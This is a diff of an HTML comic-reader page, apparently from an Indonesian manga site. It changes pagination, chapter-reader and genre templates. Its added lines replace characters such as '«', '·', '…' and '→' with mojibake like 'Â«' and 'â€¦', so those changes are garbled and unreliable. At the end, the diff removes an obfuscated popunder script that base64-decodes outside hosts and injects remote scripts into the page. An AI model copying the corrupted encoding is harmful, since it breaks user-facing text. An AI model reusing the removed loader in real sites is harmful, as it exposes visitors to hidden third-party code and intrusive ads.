@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
@@ -2184,17 +2184,17 @@ const router = {
         if (end - start < maxButtons - 1) start = Math.max(1, end - maxButtons + 1);
 
         if (page > 1) {
-            pageBtns += `<button type="button" class="az-page-btn home-page-btn" data-page="${page - 1}">« Prev</button>`;
+            pageBtns += `<button type="button" class="az-page-btn home-page-btn" data-page="${page - 1}">Â« Prev</button>`;
         }
         for (let p = start; p <= end; p++) {
             pageBtns += `<button type="button" class="az-page-btn home-page-btn ${p === page ? 'active' : ''}" data-page="${p}">${p}</button>`;
         }
         if (end < totalPages) {
-            if (end < totalPages - 1) pageBtns += `<button type="button" class="az-page-btn" disabled>…</button>`;
+            if (end < totalPages - 1) pageBtns += `<button type="button" class="az-page-btn" disabled>â€¦</button>`;
             pageBtns += `<button type="button" class="az-page-btn home-page-btn" data-page="${totalPages}">${totalPages}</button>`;
         }
         if (page < totalPages) {
-            pageBtns += `<button type="button" class="az-page-btn home-page-btn" data-page="${page + 1}">Next »</button>`;
+            pageBtns += `<button type="button" class="az-page-btn home-page-btn" data-page="${page + 1}">Next Â»</button>`;
         }
 
         this.contentEl.innerHTML = `
@@ -2218,7 +2218,7 @@ const router = {
                         <div class="bixbox">
                             <div class="releases">
                                 <h2>Update Terbaru</h2>
-                                <span style="color:var(--text-secondary);font-size:13px;">${(data.items || []).length} komik · halaman ${page}/${totalPages}</span>
+                                <span style="color:var(--text-secondary);font-size:13px;">${(data.items || []).length} komik Â· halaman ${page}/${totalPages}</span>
                             </div>
                             <div class="listupd">
                                 ${latestHTML || '<p style="color:var(--text-secondary);padding:30px;grid-column:1/-1;text-align:center;">Tidak ada update.</p>'}
@@ -2748,7 +2748,7 @@ const router = {
 
                 <h1 style="margin-bottom:8px;font-size:22px;">${this.escapeHtml(data.title)}</h1>
                 <p style="color:var(--text-secondary);margin-bottom:16px;font-size:13px;">
-                    ${chLabel} · ${images.length} halaman · dibaca terpisah per chapter
+                    ${chLabel} Â· ${images.length} halaman Â· dibaca terpisah per chapter
                 </p>
                 
                 <div class="reader-nav">
@@ -2787,7 +2787,7 @@ const router = {
                 ${hasNext ? `
                 <div style="text-align:center;margin-top:24px;">
                     <a href="#" data-url="${data.nextChapter}" class="nav-link" style="display:inline-block;background:var(--primary-color);color:#fff;padding:14px 28px;border-radius:8px;font-weight:700;">
-                        Selesai Chapter ini? Lanjut Chapter Berikutnya →
+                        Selesai Chapter ini? Lanjut Chapter Berikutnya â†’
                     </a>
                 </div>` : ''}
             </div>
@@ -2928,7 +2928,7 @@ const router = {
             <div class="genre-page">
                 <div class="genre-page-header">
                     <h2>Genre</h2>
-                    <div class="gmeta">${genres.length} genre · dari data lokal</div>
+                    <div class="gmeta">${genres.length} genre Â· dari data lokal</div>
                 </div>
                 <div class="genre-search">
                     <input type="text" id="genreFilterInput" placeholder="Cari genre..." autocomplete="off">
@@ -2999,13 +2999,13 @@ const router = {
 
         let pageBtns = '';
         if (totalPages > 1) {
-            if (page > 1) pageBtns += `<button type="button" class="az-page-btn genre-page-btn" data-page="${page - 1}">« Prev</button>`;
+            if (page > 1) pageBtns += `<button type="button" class="az-page-btn genre-page-btn" data-page="${page - 1}">Â« Prev</button>`;
             const start = Math.max(1, page - 2);
             const end = Math.min(totalPages, start + 4);
             for (let p = start; p <= end; p++) {
                 pageBtns += `<button type="button" class="az-page-btn genre-page-btn ${p === page ? 'active' : ''}" data-page="${p}">${p}</button>`;
             }
-            if (page < totalPages) pageBtns += `<button type="button" class="az-page-btn genre-page-btn" data-page="${page + 1}">Next »</button>`;
+            if (page < totalPages) pageBtns += `<button type="button" class="az-page-btn genre-page-btn" data-page="${page + 1}">Next Â»</button>`;
         }
 
         this.contentEl.innerHTML = `
@@ -3017,7 +3017,7 @@ const router = {
                 </div>
                 <div class="genre-page-header">
                     <h2>${this.escapeHtml(genre.name || 'Genre')}</h2>
-                    <div class="gmeta"><b>${genre.count || 0}</b> komik · halaman ${page}/${totalPages}</div>
+                    <div class="gmeta"><b>${genre.count || 0}</b> komik Â· halaman ${page}/${totalPages}</div>
                 </div>
                 <div class="listupd">
                     ${itemsHTML || '<p style="color:var(--text-secondary);padding:30px;grid-column:1/-1;text-align:center;">Tidak ada komik di genre ini.</p>'}
@@ -3102,14 +3102,14 @@ const router = {
             pageBtns += `<button type="button" class="az-page-btn ${p === page ? 'active' : ''}" data-page="${p}">${p}</button>`;
         }
         if (end < totalPages) {
-            if (end < totalPages - 1) pageBtns += `<button type="button" class="az-page-btn" disabled>…</button>`;
+            if (end < totalPages - 1) pageBtns += `<button type="button" class="az-page-btn" disabled>â€¦</button>`;
             pageBtns += `<button type="button" class="az-page-btn" data-page="${totalPages}">${totalPages}</button>`;
         }
         if (page < totalPages) {
-            pageBtns += `<button type="button" class="az-page-btn" data-page="${page + 1}">Next »</button>`;
+            pageBtns += `<button type="button" class="az-page-btn" data-page="${page + 1}">Next Â»</button>`;
         }
         if (page > 1) {
-            pageBtns = `<button type="button" class="az-page-btn" data-page="${page - 1}">« Prev</button>` + pageBtns;
+            pageBtns = `<button type="button" class="az-page-btn" data-page="${page - 1}">Â« Prev</button>` + pageBtns;
         }
 
         this.contentEl.innerHTML = `
@@ -3117,7 +3117,7 @@ const router = {
                 <div class="az-header">
                     <h2>AZ Lists</h2>
                     <div class="az-filters">${filtersHTML}</div>
-                    <div class="az-meta">Huruf <strong>${show}</strong> · ${data.total || 0} komik · halaman ${page}/${totalPages}</div>
+                    <div class="az-meta">Huruf <strong>${show}</strong> Â· ${data.total || 0} komik Â· halaman ${page}/${totalPages}</div>
                 </div>
                 <div class="listupd">
                     ${itemsHTML || '<p style="color:var(--text-secondary);padding:30px;grid-column:1/-1;text-align:center;">Tidak ada komik untuk filter ini.</p>'}
@@ -3322,11 +3322,5 @@ router.init();
 BookmarkStore.updateBadge();
 HistoryStore.updateBadge();
 </script>
-
-<script type="text/javascript" data-cfasync="false">/*<![CDATA[/* */
-(function(){var i=window,o="b4fa840a87522150dcc93db03b19e074",b=[["siteId",818*644*741+559+413-385034163],["minBid",0],["popundersPerIP","1,1"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],z=["d3d3LmludGVsbGlwb3B1cC5jb20vdXZpei5jc3M=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQveUxaTEVKL2Fjb250ZW50LXRvb2xzLm1pbi5qcw==","d3d3LmdoYWp3bm9iaGZzYi5jb20va3Zpei5jc3M=","d3d3LmJ3Z2FicGRnbS5jb20vZXEvemNvbnRlbnQtdG9vbHMubWluLmpz"],w=-1,k,x,s=function(){clearTimeout(x);w++;if(z[w]&&!(1819192184000<(new Date).getTime()&&1<w)){k=i.document.createElement("script");k.type="text/javascript";k.async=!0;var r=i.document.getElementsByTagName("script")[0];k.src="https://"+atob(z[w]);k.crossOrigin="anonymous";k.onerror=s;k.onload=function(){clearTimeout(x);i[o.slice(0,16)+o.slice(0,16)]||s()};x=setTimeout(s,5E3);r.parentNode.insertBefore(k,r)}};if(!i[o]){try{Object.freeze(i[o]=b)}catch(e){}s()}})();
-/*]]>/* */
-</script>
-
 </body>
 </html>
